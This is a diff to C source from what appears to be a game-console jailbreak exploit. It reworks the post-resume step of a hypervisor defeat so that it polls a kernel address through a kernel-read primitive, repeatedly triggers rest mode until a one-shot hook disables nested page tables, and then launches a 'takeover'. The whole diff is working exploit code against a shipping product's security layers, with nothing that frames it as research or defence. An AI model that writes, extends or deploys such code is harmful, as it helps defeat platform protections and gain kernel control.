@@ -761,33 +761,48 @@ int hv_defeat_1360_post_resume(void) {
     return -1;
   }
 
-  /* Poll until the action chain stamps the cookie, reporting every single poll.
-   *
-   * It used to report every fifteenth, which is a line every thirty seconds - and
-   * the console powers off five to ten seconds after the wake when the hook does
-   * not fire, so the second line never arrived. The terminal then looked identical
-   * whether the payload had died at the suspend or come back and was polling,
-   * which is the one question worth answering here.
-   *
-   * Ten minutes, because enter_rest_mode() only asks the system to suspend and
-   * returns immediately: the process carries straight on and starts polling
-   * while the console is still awake. A long window also leaves time to put the
-   * console to sleep by hand from the PS menu, which is what the reference
-   * payload relies on since it never asks the system to suspend at all. */
   notify("13.60: post-resume: polling for the cookie at %#lx.\n",
          (unsigned long)g_oracle);
-  for (int i = 0; i < 300 && cookie == 0; i++) {
-    cookie = kread64(g_oracle);
-    if (cookie == 0) {
-      notify("13.60: post-resume: still no cookie (%d/300, %ds).\n", i + 1,
-             i * 2);
-      sleep(2);
+
+  /* Poll for the cookie, and if it does not appear, ask for another suspend and
+   * try again - for as long as it takes.
+   *
+   * The hook is one-shot: it disarms itself when it fires and stays armed when it
+   * does not, so a cycle in which nothing happened needs nothing beyond another
+   * suspend. Whether the breakpoint is delivered depends on the core the resume
+   * reaches, which this process does not control, and the measured behaviour is
+   * that it lands on some attempts and not others. Offering another resume is the
+   * only practical answer, and far cheaper than sending the payload again.
+   *
+   * Every poll is reported. An earlier version reported every fifteenth, which is
+   * one line every thirty seconds - and a wake in which nothing fired ends five to
+   * ten seconds later, so the second line never arrived and the terminal looked
+   * identical whether the payload had died at the suspend or come back and was
+   * polling. */
+  for (int attempt = 1; cookie == 0; attempt++) {
+    if (attempt > 1) {
+      notify("13.60: post-resume: attempt %d - the hook is still armed, asking "
+             "for rest mode again. Wake the console when the light settles.\n",
+             attempt);
+#ifdef MANUAL_SLEEP
+      notify("13.60: MANUAL_SLEEP: put the console to sleep now (PS Button -> "
+             "Power -> Enter Rest Mode).\n");
+#else
+      enter_rest_mode();
+#endif
+      sleep(5);
+    }
+
+    for (int i = 0; i < 30 && cookie == 0; i++) {
+      cookie = kread64(g_oracle);
+      if (cookie == 0) {
+        notify("13.60: post-resume: still no cookie (%d/30, %ds), attempt %d.\n",
+               i + 1, i * 2, attempt);
+        sleep(2);
+      }
     }
   }
-  if (cookie == 0) {
-    notify("13.60: resume payload never ran (no cookie after 600s).\n");
-    return -1;
-  }
+
   notify("13.60: NPT disabled (cookie %#lx); launching takeover.\n", cookie);
 
   /* Credentials may not have survived the power cycle. */
